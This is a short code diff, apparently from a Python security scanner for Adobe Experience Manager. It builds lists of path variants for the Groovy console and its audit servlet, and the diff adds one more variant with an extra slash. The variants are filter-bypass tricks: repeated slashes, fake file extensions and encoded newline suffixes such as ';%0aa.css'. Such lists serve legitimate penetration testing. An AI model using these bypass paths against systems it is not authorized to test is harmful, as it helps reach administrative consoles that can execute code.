         ('', '/a.css', '/a.js', '/a.html', '/a.ico', '/a.png', '/a.1.json', '/a.4.2.1...json', ';%0aa.css', ';%0aa.html',
          ';%0aa.js', ';%0aa.ico', ';%0aa.png')
     )
     GROOVYSCRIPT2 = list('{0}{1}'.format(p1, p2) for p1, p2 in GROOVYSCRIPT2)
 
     GROOVYAUDIT = itertools.product(
-        ('/bin/groovyconsole/audit.servlet', '///bin///groovyconsole///audit.servlet'),
+        ('/bin/groovyconsole/audit.servlet', '///bin///groovyconsole///audit.servlet','////bin///groovyconsole///audit.servlet'),
         ('', '.css', '.js', '.html', '.ico', '.png', '.json', '.1.json', '.4.2.1...json', ';%0aa.css', ';%0aa.html',
          ';%0aa.js', ';%0aa.ico', ';%0aa.png')
     )
